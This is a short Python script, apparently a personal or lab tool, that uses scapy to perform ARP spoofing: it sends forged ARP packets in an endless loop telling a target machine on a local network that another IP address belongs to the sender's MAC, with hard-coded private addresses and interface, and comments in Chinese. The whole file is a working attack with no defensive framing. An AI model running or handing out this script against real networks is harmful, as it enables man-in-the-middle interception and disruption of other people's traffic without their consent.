from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    Ether,
    ARP,
    sendp)

def arp_spoof(target,host,iface):
    # target 目标机ip
    # host   伪装的ip

    mac_self = get_if_hwaddr(iface)
    mac_target = getmacbyip(target)
    try:
        while 1 :
            sendp(Ether(src=mac_self,dst=mac_target)/
                  ARP(hwsrc=mac_self,hwdst=mac_target,psrc=host,pdst=target,op=1))

    except KeyboardInterrupt: #捕获Ctrl + C
            print('\n[+]Stopped poison')

if __name__ == '__main__':
    target = '192.168.167.60'
    host = '192.168.167.173'
    iface = 'ens33'
    arp_spoof(target,host,iface)
